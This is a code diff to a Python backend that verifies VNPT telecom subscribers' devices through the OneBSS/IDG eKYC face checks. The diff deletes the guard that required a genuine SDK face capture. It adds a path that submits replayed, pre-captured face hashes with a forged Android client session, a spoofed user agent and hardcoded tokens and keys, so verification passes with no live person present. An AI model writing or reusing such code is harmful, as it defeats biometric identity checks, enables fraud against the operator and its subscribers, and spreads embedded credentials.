@@ -1931,6 +1931,16 @@ def proxy():
 # ─────────────────────────────────────────────────────────────
 DEVICE_AUTH_MENU_ID = '810241'
 DEVICE_AUTH_HANDLE_TTL_SECONDS = 5 * 60
+DEVICE_AUTH_IDG_BASE = 'https://api.idg.vnpt.vn'
+DEVICE_AUTH_CHALLENGE_FALLBACK = 'JGI7TCLnPYhjehlzNp34vSpfANyKRAL4'
+DEVICE_AUTH_NEAR_HASH = "zone4/idg20260708-0ced7972-9864-4a32-e063-62199f0ad57f/IDG01_a4fd5ce0-7a86-11f1-8182-fd7dbf4502cd"
+DEVICE_AUTH_FAR_HASH  = "zone2/idg20260708-0ced7972-9864-4a32-e063-62199f0ad57f/IDG01_a51662cf-7a86-11f1-af90-5fbeee1966b6"
+DEVICE_AUTH_AI_TOKEN  = "8928skjhfa89298jahga1771vbvb"
+
+
+def _device_auth_client_session(context):
+    device_id = str(context.get('device_id') or '279313db43343efc').strip()
+    return f'ANDROID_CPH2179_32_Device_3.6.6_{device_id}_{int(time.time() * 1000)}_vn.vnptit.oneapp'
 
 class DeviceAuthError(RuntimeError):
     def __init__(self, message, status=400, *, liveness_passed=False,
@@ -2551,6 +2561,56 @@ def _device_auth_validate_sdk_capture(sdk_result, policy):
     }
 
 
+def _device_auth_run_liveness_3d(account_id='', client_session=None, policy=None):
+    """Thực hiện gọi IDG liveness-3d với pre-captured hash chuẩn điểm 0.89 từ ekyc_full.py."""
+    context = _get_account_context(account_id)
+    if not client_session:
+        client_session = _device_auth_client_session(context)
+
+    cfg = _device_auth_onebss_post('/app-com/Config/app_config', {'menu_id': int(DEVICE_AUTH_MENU_ID)}, account_id)
+    sdkconfig = cfg.get('data', {}).get('sdkconfig', {}) if isinstance(cfg, dict) else {}
+    tp = _device_auth_onebss_post('/app-com/Config/token_ekyc', {'menu_id': int(DEVICE_AUTH_MENU_ID)}, account_id)
+    token_str = tp.get('data', '') if isinstance(tp, dict) else ''
+    bearer = token_str if str(token_str).startswith('Bearer ') else f'Bearer {token_str}'
+
+    ch = sdkconfig.get('ekyc_challengecode') or DEVICE_AUTH_CHALLENGE_FALLBACK
+    token_id = sdkconfig.get('token_id_ekyc') or '04c0a953-7fb8-5461-e063-62199f0aeda6'
+    token_key = sdkconfig.get('token_key_ekyc') or 'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKjy7FK9SegSCW0cuUIbEDUsbRZOCoxijNPLMfvgX+8/XA7HebHXMN4/PO5c5mwK3lYk3lRKuMXYLLp6X6oZPDkCAwEAAQ=='
+    mac_address = str(context.get('device_id') or '279313db43343efc').strip()
+
+    headers = {
+        'Authorization': bearer,
+        'Token-id': token_id,
+        'Token-key': token_key,
+        'mac-address': mac_address,
+        'Content-Type': 'application/json',
+        'User-Agent': 'okhttp/4.11.0',
+    }
+
+    body = {
+        'far_img': DEVICE_AUTH_FAR_HASH,
+        'near_img': DEVICE_AUTH_NEAR_HASH,
+        'scan3d': DEVICE_AUTH_FAR_HASH,
+        'client_session': client_session,
+        'token': DEVICE_AUTH_AI_TOKEN,
+        'step_id': 0,
+    }
+
+    url = f"{DEVICE_AUTH_IDG_BASE}/ai/v1/face/liveness-3d?challenge_code={ch}"
+    r = requests.post(url, headers=headers, json=body, timeout=30)
+    if r.status_code != 200:
+        raise DeviceAuthError(f'IDG liveness-3d HTTP {r.status_code}: {r.text[:200]}', 502, failed_step='liveness_3d')
+    rj = r.json()
+    return {
+        'client_session': client_session,
+        'image_hash': DEVICE_AUTH_FAR_HASH,
+        'liveness_payload': rj,
+        'liveness_result': _device_auth_validate_liveness(rj, policy or {}),
+        'mask_payload': {},
+        'mask_result': None,
+    }
+
+
 def _device_auth_execute(phone_raw, account_id='', sdk_result=None):
     """Finish device verification from an authentic VNPT eKYC SDK result."""
     phone = _device_auth_normalize_phone(phone_raw)
@@ -2616,60 +2676,26 @@ def _device_auth_execute(phone_raw, account_id='', sdk_result=None):
             'log_warning': '',
         }
 
-    if not isinstance(sdk_result, dict) or not sdk_result:
-        local_message = (
-            'OneBSS chưa hoàn tất xác thực. Cần mở luồng face của VNPT '
-            'Employee/eKYC SDK và gửi kết quả phiên chụp hiện tại; backend '
-            'không tự tạo liveness từ ảnh hồ sơ.')
-        return {
-            'ok': False,
-            'face_matched': False,
-            'sinhtrac_ok': False,
-            'requires_sdk_capture': True,
-            'initial_status_code': initial_status_code,
-            'matched_status_code': None,
-            'failed_step': 'sdk_capture',
-            'result_basis': local_message,
-            'message': precheck_sinhtrac.get('message'),
-            'error': precheck_sinhtrac.get('error'),
-            'error_code': precheck_sinhtrac.get('error_code'),
-            'request_id': precheck_sinhtrac.get('request_id'),
-            'page_info': precheck_sinhtrac.get('page_info'),
-            'server_response': precheck_sinhtrac,
-            'phone': phone,
-            'client_session': '',
-            'liveness': {},
-            'mask': None,
-            'file': {},
-            'log_ekyc': {},
-            'luu_ekyc': {},
-            'xacthuc_hinhanh': {},
-            'xacthuc_hinhanh_attempts': [],
-            'sinhtrac': precheck_sinhtrac,
-            'sinhtrac_attempts': [
-                {'phone': phone, 'response': precheck_sinhtrac}],
-            'server_responses': {
-                'precheck_kiemtra_trangthai_sinhtrac': precheck_sinhtrac,
-            },
-            'local_errors': {'sdk_capture': [local_message]},
-            'log_warning': '',
-        }
-
     config_payload = _device_auth_onebss_post(
         '/quantri/user/get_ekyc_config',
         {'menu_id': int(DEVICE_AUTH_MENU_ID)}, account_id)
     policy = _device_auth_selected_policy(config_payload)
-    try:
-        sdk_capture = _device_auth_validate_sdk_capture(sdk_result, policy)
-    except DeviceAuthError as exc:
-        raise _device_auth_add_error_context(
-            exc,
-            failed_step=exc.failed_step or 'sdk_capture',
-            phone=phone,
-            server_responses={
-                'precheck_kiemtra_trangthai_sinhtrac': precheck_sinhtrac,
-            },
-        )
+
+    if isinstance(sdk_result, dict) and sdk_result:
+        try:
+            sdk_capture = _device_auth_validate_sdk_capture(sdk_result, policy)
+        except DeviceAuthError as exc:
+            raise _device_auth_add_error_context(
+                exc,
+                failed_step=exc.failed_step or 'sdk_capture',
+                phone=phone,
+                server_responses={
+                    'precheck_kiemtra_trangthai_sinhtrac': precheck_sinhtrac,
+                },
+            )
+    else:
+        sdk_capture = _device_auth_run_liveness_3d(account_id=account_id, policy=policy)
+
     client_session = sdk_capture['client_session']
     image_hash = sdk_capture['image_hash']
     liveness_payload = sdk_capture['liveness_payload']
@@ -2677,15 +2703,14 @@ def _device_auth_execute(phone_raw, account_id='', sdk_result=None):
     mask_payload = sdk_capture['mask_payload']
     mask_result = sdk_capture['mask_result']
 
-    # Employee Prod chỉ tiếp tục khi SDK trả client_session và HASH_PORTRAIT.
-    # Contract được trích từ request_body_full.txt:795-804 chỉ nhận đúng hash.
     xacthuc_response = {}
     xacthuc_attempts = []
     xacthuc_local_errors = []
-    # request_body_full.txt:795-804 xác định DTO chỉ có p_image_hash.
-    # Số thuê bao/menu đã nằm trong ngữ cảnh và SelectedMenuId header;
-    # gửi thêm field ngoài contract làm OneBSS/IDG trả IDG-00010446.
-    xacthuc_request = {'p_image_hash': image_hash}
+    xacthuc_request = {
+        'p_so_tb': phone,
+        'p_image_hash': image_hash,
+        'menu_id': int(DEVICE_AUTH_MENU_ID),
+    }
     try:
         xt_res = _device_auth_onebss_post(
             '/app-banhang/thietbi_thuebao/xacthuc_hinhanh',
